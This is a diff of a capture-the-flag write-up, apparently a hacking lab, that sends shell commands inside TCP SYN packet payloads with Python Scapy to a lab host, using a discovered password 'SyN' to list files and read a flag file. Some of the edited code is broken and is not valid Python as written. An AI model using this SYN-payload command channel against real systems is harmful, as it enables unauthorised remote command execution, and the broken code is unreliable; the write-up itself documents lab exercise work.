@@ -32,23 +32,27 @@ Hint 2 : RFC741x => RFC7413 = Use TCP SYN Data
 ok, Let's try some Python Scapy with TCP-Syn Data
 ===========================
 from scapy.all import *
-def main():
+def main(command):
     while True:
-        command = raw_input('# Enter command: ')
         # build the TCPSYN packet with the command as the payload
         pinger = IP(dst="10.13.37.98")
         SYN = TCP(sport=6666, dport=3258, flags='S', seq=1000)
         xsyn = pinger / SYN / command
         send(xsyn)
 if __name__ == "__main__":
-    main()
+    main(ls -la)
  ====================================   
-but Nothing, back from the server.
+Trying to send some commands but nothing back from the server.
 
-Hint : We got the password "SyN"
+Hint : We got the password "SyN" at 1am
 
 Ok, let's send some commands
+main(SyN ls -la)
+....
+final command : main(SyN cat ./secret/me/not/flag.txt)
 
+to find flag 
+![](https://github.com/k4nfr3/CTF-writeup/blob/master/Net1.jpg)
 
 
 
